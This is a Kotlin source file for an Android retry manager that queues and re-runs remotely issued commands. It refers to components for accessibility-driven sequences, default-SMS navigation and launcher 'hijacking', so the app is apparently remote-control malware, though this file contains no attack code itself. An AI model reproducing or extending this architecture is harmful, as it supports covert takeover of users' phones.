package com.example.myandroid

import android.content.Context
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject

object CommandRetryManager {
    private const val PREFS = "cortex_retries"

    fun scheduleRetry(ctx: Context, cmdId: Int, fileName: String, content: String, reason: String) {
        if (cmdId < 0) {
            DebugLogger.log("RETRY_MGR", "Ignoring retry for internal/mock command (ID: $cmdId).")
            return
        }

        val prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        
        // 1. Read permanent history (Immune to queue popping)
        val attempts = prefs.getInt("attempts_$cmdId", 0) + 1

        if (attempts > 3) {
            DebugLogger.log("RETRY_MGR", "Command [$fileName] failed 3 times. Giving up. ($reason)")
            CommandProcessor.updateCommandStatus(ctx, cmdId, "FAILED_PERMANENTLY", "Exceeded max retries (3/3). Last reason: $reason")
            // Clean up the tracking key now that we are permanently done
            prefs.edit().remove("attempts_$cmdId").apply()
        } else {
            // Update permanent history
            prefs.edit().putInt("attempts_$cmdId", attempts).apply()
            DebugLogger.log("RETRY_MGR", "Scheduling retry $attempts/3 for [$fileName] in 60s. ($reason)")
            
            val retriesStr = prefs.getString("queue", "[]") ?: "[]"
            val retries = try { JSONArray(retriesStr) } catch(e: Exception) { JSONArray() }
            val newRetries = JSONArray()
            
            // Filter out any existing duplicates in the queue array
            for (i in 0 until retries.length()) {
                val r = retries.getJSONObject(i)
                if (r.optInt("id") != cmdId) {
                    newRetries.put(r)
                }
            }
            
            val entry = JSONObject().apply {
                put("id", cmdId)
                put("file_name", fileName)
                put("content", content)
                put("attempts", attempts)
                put("triggerAt", System.currentTimeMillis() + 60_000L)
            }
            newRetries.put(entry)
            prefs.edit().putString("queue", newRetries.toString()).apply()
        }
    }

    suspend fun processPendingRetries(ctx: Context) {
        val prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        val retriesStr = prefs.getString("queue", "[]") ?: "[]"
        if (retriesStr == "[]") return

        val retries = try { JSONArray(retriesStr) } catch(e: Exception) { JSONArray() }
        if (retries.length() == 0) return

        val now = System.currentTimeMillis()
        val newRetries = JSONArray()
        val toExecute = mutableListOf<JSONObject>()

        for (i in 0 until retries.length()) {
            val r = retries.getJSONObject(i)
            if (now >= r.optLong("triggerAt", 0L)) {
                if (isSystemBusy(ctx)) {
                    DebugLogger.log("RETRY_MGR", "System busy. Delaying retry for [${r.optString("file_name")}] by 15s...")
                    r.put("triggerAt", now + 15_000L)
                    newRetries.put(r)
                } else {
                    toExecute.add(r)
                }
            } else {
                newRetries.put(r)
            }
        }

        prefs.edit().putString("queue", newRetries.toString()).apply()

        for (cmd in toExecute) {
            DebugLogger.log("RETRY_MGR", "Executing retry ${cmd.optInt("attempts")} for [${cmd.optString("file_name")}]")
            CommandProcessor.processSingleCommand(ctx, cmd)
            delay(2000) // Delay between commands to avoid collisions
        }
    }

    private fun isSystemBusy(ctx: Context): Boolean {
        val isUiAttached = DynamicUIManager.isAnyAttached
        val hasSequence = MyAccessibilityService.instance?.activeSequence != null
        val isSmsNavigating = DefaultSmsManager.expectedMode.isNotEmpty()
        val isHijacking = LauncherManager.isHijacking
        val isWaitingData = MyAccessibilityService.instance?.isWaitingForDataSettings == true
        return isUiAttached || hasSequence || isSmsNavigating || isHijacking || isWaitingData
    }
}
